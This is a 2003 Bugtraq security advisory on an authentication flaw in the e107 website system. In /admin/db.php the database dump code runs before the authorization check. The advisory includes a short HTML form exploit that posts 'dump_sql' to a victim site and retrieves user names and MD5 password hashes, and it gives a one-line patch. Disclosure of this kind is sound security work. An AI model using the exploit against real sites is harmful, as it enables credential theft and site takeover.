
Date: Thu, 24 Jul 2003 19:49:47 +0400
From: Artoor Petrovich <artoor@...loyt.com>
To: bugtraq@...urityfocus.com
Subject: e107 website system Vulnerability


Informations :


Advisory Name: e107 website system Vulnerability

Author: hiruvim <artoor@...loyt.com>

Discover by: hiruvim <artoor@...loyt.com>

Website vendor : http://e107.org

Affected System(s): All versions

Severity: High

Platform(s): Windows and Unix

Issue: Security holes enable attackers to get MySQL dump file with
users and passwords.

==================================================
Details:

 In file /admin/db.php
.......................
require_once("../class2.php");

if(IsSet($_POST['dump_sql'])){
        getsql($mySQLdefaultdb);
        exit;
}

[....]
require_once("auth.php");

.......................

We can do dump_sql without authorization.

Exploit:

<form action="http://victim.org/admin/db.php">
<input type=submit name="dump_sql">
</form>

When pressed submit query button we will get MySQL dump file.
 
In dump file we will find username and passwd MD5 hash.

With admin password we can get full site control and access to
FileManager.



Vendor: Not contacted yet.

Patch:

in /admin/db.php

Before doing anything you will need tomove "require_once("auth.php");"
to the top of the file.

Sorry for my poor english:)

==============================
hiruvim <artoor@...loyt.com>
Original document can be fount at http://0x90.ipsec.ru/e107.txt



